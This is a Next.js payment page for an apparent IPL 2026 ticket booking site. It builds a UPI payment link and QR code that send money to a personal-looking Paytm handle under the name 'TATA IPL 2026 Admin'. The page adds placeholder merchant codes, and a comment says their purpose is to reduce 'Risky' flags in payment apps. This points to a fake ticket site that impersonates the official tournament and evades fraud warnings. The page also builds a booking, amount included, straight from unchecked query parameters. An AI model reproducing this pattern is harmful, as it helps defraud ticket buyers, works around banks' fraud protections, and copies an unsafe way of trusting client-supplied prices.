import { getBookingById } from "@/lib/booking-actions";
import { getMatchById } from "@/lib/matches";
import { notFound } from "next/navigation";
import { PaymentFlow } from "@/components/payment-flow";

interface PageProps {
  params: Promise<{ id: string }>;
  searchParams: Promise<{ category?: string; qty?: string; amount?: string }>;
}

export default async function PaymentPage({ params, searchParams }: PageProps) {
  const { id } = await params;
  const sParams = await searchParams;
  
  // Try to get a real booking from DB first
  let booking = await getBookingById(id);
  let match = booking?.matches;

  // Fallback: If no booking ID found, check if it's a direct matchId with query params
  if (!booking) {
    const matchData = await getMatchById(id);
    if (matchData && sParams.category) {
      // Simulate booking object from query params
      booking = {
        id: id,
        match_id: id,
        category: sParams.category,
        quantity: parseInt(sParams.qty || "1"),
        total_price: parseInt(sParams.amount || "0"),
        status: 'pending',
        full_name: 'Fan', 
        email: '',
        phone: ''
      } as any;
      match = matchData as any;
    }
  }

  if (!booking) {
    notFound();
  }

  // UPI Payment Configuration
  const upiId = "paytm.s1yjhpw@pty";
  const merchantName = "TATA IPL 2026 Admin";
  const amount = booking.total_price;
  const transactionNote = `IPL Booking ${id.slice(0, 8)}`;
  
  // Construct UPI Deep Link with Merchant Metadata to reduce 'Risky' flags
  const mc = "0000"; // Generic Merchant Code (Change to specific if available)
  const upiUrl = `upi://pay?pa=${upiId}&pn=${encodeURIComponent(merchantName)}&am=${amount}&cu=INR&tn=${encodeURIComponent(transactionNote)}&mc=${mc}&mode=02&orgid=000000`;
  
  // QR Code URL
  const qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?size=400x400&data=${encodeURIComponent(upiUrl)}`;
  
  const upiConfig = {
    upiId,
    merchantName,
    amount,
    transactionNote,
    upiUrl,
    qrCodeUrl
  };

  return (
    <main className="min-h-screen bg-slate-50 relative overflow-hidden">
      {/* Decorative Background Elements */}
      <div className="absolute top-0 right-0 w-[60vh] h-[60vh] bg-blue-600/5 blur-[120px] -translate-y-1/2 translate-x-1/2" />
      <div className="absolute bottom-0 left-0 w-[50vh] h-[50vh] bg-[#f04e23]/5 blur-[120px] translate-y-1/2 -translate-x-1/2" />

      <section className="py-16 md:py-24 relative z-10">
        <div className="container mx-auto px-4 max-w-4xl">
          {/* Header */}
          <div className="flex flex-col items-center mb-16 text-center animate-in fade-in slide-in-from-top-4 duration-700">
            <div className="inline-flex items-center gap-3 px-6 py-2 bg-slate-900 text-white rounded-full text-[10px] font-black uppercase tracking-[0.3em] mb-8">
              Step <span className="text-[#f04e23]">03</span> / Checkout
            </div>
            <h1 className="text-4xl md:text-6xl font-black uppercase tracking-tighter text-slate-900 mb-4 leading-none">
              Final <span className="text-[#f04e23]">Verification</span>
            </h1>
            <p className="max-w-xl text-slate-500 font-bold uppercase tracking-widest text-[11px] leading-relaxed">
              Verify your information and complete the secure payment.
            </p>
          </div>

          <PaymentFlow 
            id={id} 
            match={match} 
            initialBooking={booking} 
            upiConfig={upiConfig} 
          />
        </div>
      </section>
    </main>
  );
}
